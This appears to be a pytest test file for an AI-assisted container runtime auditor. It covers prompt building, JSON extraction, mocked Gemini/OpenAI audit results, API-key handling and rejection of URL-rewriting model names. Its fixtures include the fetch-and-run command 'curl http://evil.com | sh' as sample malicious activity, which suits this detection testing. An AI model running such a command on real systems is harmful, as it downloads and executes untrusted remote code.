from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest

from porygon_api.ai_auditor import (
    _extract_json_from_text,
    build_audit_prompt,
    perform_container_audit,
)


def test_build_audit_prompt() -> None:
    container_info = {
        "container_id": "abcdef123456",
        "container_name": "web-app",
        "image_ref": "nginx:latest",
        "image_digest": "sha256:" + "0" * 64,
        "ports": ["80/tcp"],
    }
    events = [
        {
            "occurred_at": "2026-09-14T20:00:00Z",
            "process_name": "sh",
            "executable": "/bin/sh",
            "command_line": "sh -c 'curl http://evil.com | sh'",
            "user_uid": 0,
            "parent_name": "nginx",
            "parent_command_line": "nginx -g 'daemon off;'",
        }
    ]
    prompt = build_audit_prompt(
        container_info=container_info,
        events=events,
        porygon_drift_score=0.85,
        matched_rules=["POR-DET-002"],
        cves=[{"cve_id": "CVE-2024-1234", "severity": "CRITICAL"}],
    )
    assert "abcdef123456" in prompt
    assert "web-app" in prompt
    assert "curl http://evil.com" in prompt
    assert "0.85" in prompt
    assert "CVE-2024-1234" in prompt


def test_extract_json_from_text() -> None:
    # Plain JSON
    plain = '{"ai_risk_score": 0.95, "threat_level": "critical"}'
    assert _extract_json_from_text(plain)["ai_risk_score"] == 0.95

    # Markdown wrapped JSON
    md = '```json\n{"ai_risk_score": 0.4, "threat_level": "medium"}\n```'
    assert _extract_json_from_text(md)["ai_risk_score"] == 0.4

    # Text before and after
    noisy = 'Here is your analysis:\n{"ai_risk_score": 0.1, "threat_level": "clean"}\nHope this helps!'
    assert _extract_json_from_text(noisy)["threat_level"] == "clean"


@patch("porygon_api.ai_auditor._call_gemini")
def test_perform_container_audit_gemini(mock_call: MagicMock) -> None:
    mock_call.return_value = {
        "ai_risk_score": 0.88,
        "threat_level": "high",
        "confidence": 0.95,
        "summary": "Suspicious reverse shell downloader detected.",
        "semantic_analysis": "The process executes a remote pipe to sh from an untrusted host.",
        "flagged_commands": [
            {
                "command": "curl http://evil.com | sh",
                "executable": "/bin/sh",
                "user_uid": 0,
                "reason": "Living-off-the-land dropper sequence",
                "severity": "high",
            }
        ],
        "containment_suggestions": ["Pause container immediately", "Block outbound network"],
        "rule_gap_analysis": "Deterministic rules spotted shell invocation; AI identified external dropper IP.",
    }

    res = perform_container_audit(
        container_info={"container_id": "test12345678", "container_name": "target"},
        events=[],
        porygon_drift_score=0.72,
        matched_rules=["POR-DET-002"],
        cves=[],
        provider="gemini",
        api_key="test-gemini-key",
    )

    assert res.ai_risk_score == 0.88
    assert res.threat_level == "high"
    assert res.provider == "gemini"
    assert len(res.flagged_commands) == 1
    assert res.flagged_commands[0].severity == "high"
    assert "Pause container" in res.containment_suggestions[0]


@patch("porygon_api.ai_auditor._call_openai")
def test_perform_container_audit_openai(mock_call: MagicMock) -> None:
    mock_call.return_value = {
        "ai_risk_score": 0.05,
        "threat_level": "clean",
        "confidence": 0.9,
        "summary": "Container is performing normal static file serving.",
        "semantic_analysis": "Routine HTTP handling and child worker fork.",
        "flagged_commands": [],
        "containment_suggestions": [],
    }

    res = perform_container_audit(
        container_info={"container_id": "test12345678"},
        events=[],
        porygon_drift_score=0.02,
        matched_rules=[],
        cves=[],
        provider="openai",
        api_key="test-openai-key",
    )

    assert res.ai_risk_score == 0.05
    assert res.threat_level == "clean"
    assert res.provider == "openai"


def test_perform_container_audit_unsupported_provider() -> None:
    with pytest.raises(ValueError, match="Unsupported AI provider"):
        perform_container_audit(
            container_info={"container_id": "test"},
            events=[],
            porygon_drift_score=None,
            matched_rules=[],
            cves=[],
            provider="unknown_provider",
            api_key="key",
        )


class _CapturedResponse:
    def __init__(self, body: bytes) -> None:
        self._body = body

    def read(self) -> bytes:
        return self._body

    def __enter__(self) -> "_CapturedResponse":
        return self

    def __exit__(self, *exc: object) -> None:
        return None


def test_gemini_key_travels_in_a_header_not_the_url() -> None:
    from porygon_api import ai_auditor

    body = (
        b'{"candidates":[{"content":{"parts":[{"text":'
        b'"{\\"ai_risk_score\\": 0.1, \\"threat_level\\": \\"low\\"}"}]}}]}'
    )
    captured = []

    def fake_urlopen(request, timeout=None):
        captured.append(request)
        return _CapturedResponse(body)

    secret = "AIzaSy-test-secret-value"
    with patch.object(ai_auditor.urllib.request, "urlopen", side_effect=fake_urlopen):
        ai_auditor._call_gemini(secret, "gemini-1.5-flash", "prompt")

    assert captured, "no request was made"
    for request in captured:
        assert secret not in request.full_url, request.full_url
        # urllib normalises header names with str.capitalize().
        assert request.get_header("X-goog-api-key") == secret


@pytest.mark.parametrize(
    "model",
    ["gemini-1.5-flash", "models/gemini-2.0-flash", "gpt-4o-mini", "claude-3-5-haiku-20241022"],
)
def test_audit_request_accepts_real_model_names(model: str) -> None:
    from porygon_api.schemas import AiAuditIn

    assert AiAuditIn(container_id="abc", model=model).model == model


@pytest.mark.parametrize(
    "model",
    ["../../v1/models", "flash?key=x", "flash#", "a/b", "flash generateContent", "-flash"],
)
def test_audit_request_rejects_model_names_that_rewrite_the_url(model: str) -> None:
    from pydantic import ValidationError

    from porygon_api.schemas import AiAuditIn

    with pytest.raises(ValidationError):
        AiAuditIn(container_id="abc", model=model)
